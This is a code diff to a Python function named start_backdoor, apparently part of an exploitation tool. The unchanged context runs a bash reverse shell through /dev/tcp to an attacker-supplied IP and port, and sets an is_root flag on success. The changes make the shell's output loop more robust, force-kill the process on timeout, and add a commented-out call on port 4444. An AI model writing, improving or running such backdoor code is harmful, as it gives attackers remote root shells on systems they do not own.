@@ -33,15 +33,25 @@ def start_backdoor(atk_ip, atk_port):
             run_command(process, f"bash -i >& /dev/tcp/{atk_ip}/{atk_port} 0>&1 \n")
 
             # read output
-            output = process.stdout.readline()
-            while str(output.strip()) != "b'exit'":
-                print(output.strip())
+            while True:
                 output = process.stdout.readline()
+
+                # Check if the process has ended
+                if process.poll() is not None:
+                    print("Reverse shell closed")
+                    break
+
+                # Print output if the process is still running
+                if output:
+                    print(output.strip())
 
             # close process
             process.stdin.close()
             process.terminate()
-            process.wait(timeout=1)
+            try:
+                process.wait(timeout=1)
+            except subprocess.TimeoutExpired:
+                process.kill()
             is_root = True
         except RuntimeError:
             print("An error occured during exploitation...")
@@ -71,3 +81,6 @@ def run():
     # code ...
     success = True
     return success
+
+
+# start_backdoor("", "4444")
